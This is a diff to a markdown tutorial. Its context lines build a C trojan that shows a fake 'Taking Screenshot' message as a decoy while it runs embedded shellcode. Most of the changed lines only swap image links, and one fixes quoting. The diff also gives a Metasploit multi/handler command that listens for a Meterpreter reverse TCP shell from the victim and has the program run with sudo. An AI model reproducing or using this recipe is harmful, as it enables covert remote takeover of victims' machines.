@@ -124,7 +124,7 @@ echo "unsigned char buf[] = \"$pa\";" >> payload.c
 echo "" >> payload.c
 echo "int main()" >> payload.c
 echo "{" >> payload.c
-echo "  printf(\"\nPlease Wait, Taking Screenshot ..\n\....................................", strlen(buf));" >> payload.c
+echo "  printf(\"\\nPlease Wait, Taking Screenshot ..\n....................................\", strlen(buf));" >> payload.c
 echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
 echo "  system(\"sleep 1; xwud -in /tmp/ScreenShot.xwd &\");" >> payload.c
 echo "  void (*ret)() = (void(*)())buf;" >> payload.c
@@ -132,7 +132,7 @@ echo "  ret();" >> payload.c
 echo "}" >> payload.c
 ```
 
-![pic](http://i63.tinypic.com/2wm1aax.png)
+![pic](http://i67.tinypic.com/309rd74.png)
 
 <br />
 
@@ -142,7 +142,7 @@ echo "}" >> payload.c
 cat payload.c
 ```
 
-![pic](http://i65.tinypic.com/wkh8h2.png)
+![pic](http://i68.tinypic.com/24y1ojb.png)
 
 <br />
 
@@ -164,7 +164,7 @@ WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to
 sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
 ```
 
-![pic](http://i66.tinypic.com/kao6ps.png)
+![pic](http://i68.tinypic.com/15wlyxs.png)
 
 <br />
 
@@ -175,7 +175,7 @@ chmod +x desktop_screenshot
 sudo ./desktop_screenshot
 ```
 
-![pic](http://i63.tinypic.com/24kzad1.png)
+![pic](http://i67.tinypic.com/16h9sax.png)
 
 <br />
 
